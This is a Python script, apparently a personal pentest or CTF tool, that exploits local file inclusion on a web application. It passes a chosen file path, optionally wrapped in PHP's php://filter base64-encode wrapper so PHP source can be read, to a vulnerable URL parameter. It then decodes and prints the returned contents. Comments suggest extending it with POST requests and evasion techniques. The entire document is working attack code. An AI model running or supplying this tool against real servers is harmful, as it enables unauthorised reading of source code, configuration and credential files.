import argparse
import requests
import base64
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser('Get a file via lfi')
parser.add_argument('url', help='url with vulnerable file')
parser.add_argument('param', help='name of parameter with lfi')
parser.add_argument('file', help='file to include')
parser.add_argument('--base64', help='use base64 php encode technique (to read php files)', action='store_true')

args = parser.parse_args()

def extract(html: str) -> str:

    return html

    # # modify this to get base64 encoded include
    # soup = BeautifulSoup(html, 'html.parser')
    # tag_with_base64 = soup.find('a_tag')
    # content: str = tag_with_base64.string
    # return content





if __name__ == '__main__':

    # modify this to use post or evasion techniques
    payload = 'php://filter/convert.base64-encode/resource={}'.format(args.file) if args.base64 else args.file

    r = requests.get(args.url, params={args.param: payload})

    value = extract(r.text)

    if args.base64:
        print(base64.b64decode(value).decode())
    else:
        print(value)
